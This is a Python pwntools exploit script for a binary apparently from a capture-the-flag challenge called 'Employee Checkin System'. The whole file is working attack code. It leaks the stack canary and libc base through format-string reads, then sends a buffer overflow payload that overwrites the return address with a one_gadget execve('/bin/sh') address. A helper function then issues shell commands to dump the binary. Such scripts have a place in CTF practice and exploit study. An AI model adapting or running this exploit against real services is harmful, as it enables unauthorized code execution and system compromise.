#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 1
context.arch = "amd64"
context.log_level = "debug"
elf = ELF("./e",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	s = process("./e")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./e", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	libc = ELF("./libc.so.6",checksec=False)
	ip = "localhost" 
	port = 10001
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
   '''Stage1: Leak cookie'''
   s.sla("number:", "AAAA")

   #z(0x4007EB)
   s.sla("name:", "%9$p")

   s.ru("0x")
   cookie = int(s.r(16), 16)
   info("cookie: 0x%x", cookie)


   '''Stage2: Leak Stage2'''
   s.sla("number:", "AAAA")

   #z(0x4007EB)
   s.sla("name:", "%17$p")

   s.ru("0x")
   libc.address = int(s.r(12), 16) - libc.sym["__libc_start_main"] - 240
   info("libc.address: 0x%x", libc.address)
   one_shot = libc.address + 0x45216
   info("one_shot: 0x%x", one_shot)

   '''one_shot'''
   '''
   root@linuxkit-025000000001:/pwn/Employee Checkin System# one_gadget /lib/x86_64-linux-gnu/libc.so.6
   0x45216	execve("/bin/sh", rsp+0x30, environ)
   constraints:
   rax == NULL

   0x4526a	execve("/bin/sh", rsp+0x30, environ)
   constraints:
   [rsp+0x30] == NULL

   0xf02a4	execve("/bin/sh", rsp+0x50, environ)
   constraints:
   [rsp+0x50] == NULL

   0xf1147	execve("/bin/sh", rsp+0x70, environ)
   constraints:
   [rsp+0x70] == NULL
   '''


   '''Stage3: Get shell'''
   #z(0x400863)
   pop_rdi = 0x4009c3

   pl = ""
   pl += "A" * 0x18
   pl += p64(cookie)
   pl += "B" * 8
   pl += p64(one_shot)
   s.sla("number:", pl)


   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat e")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()
